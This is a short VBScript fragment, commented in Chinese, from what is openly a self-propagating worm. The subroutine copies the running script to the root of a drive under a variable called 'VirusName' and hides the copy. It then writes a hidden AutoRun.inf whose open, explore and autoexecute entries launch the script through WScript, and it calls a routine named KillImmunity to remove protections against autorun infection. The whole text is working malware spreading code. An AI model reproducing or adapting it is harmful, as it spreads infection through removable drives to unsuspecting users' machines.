Sub CreateAutoRun(D,VirusName) '创建autorun.inf文件
	On Error Resume Next
	Dim InfPath, VBSPath, VBSCode
	InfPath=D&":\AutoRun.inf"
	VBSPath=D&":\"&VirusName
	VBSCode=GetCode(WScript.ScriptFullName)
	If FSO.FileExists(InfPath) = False Or FSO.FileExists(VBSPath) = False Then
		Call CreateFile(VBSCode, VBSPath)
		Call SetHiddenAttr(VBSPath)
		StrInf="[AutoRun]"&VBCRLF&"Shellexecute=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell\open=打开(&O)"&VBCRLF&"shell\open\command=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell\open\Default=1"& VBCRLF&"shell\explore=资源管理器(&X)"&VBCRLF&"shell\explore\command=WScript.exe "&VirusName&" ""AutoRun"""
		Call KillImmunity(D)
		Call CreateFile(StrInf, InfPath)
		Call SetHiddenAttr(InfPath)
	End If
End Sub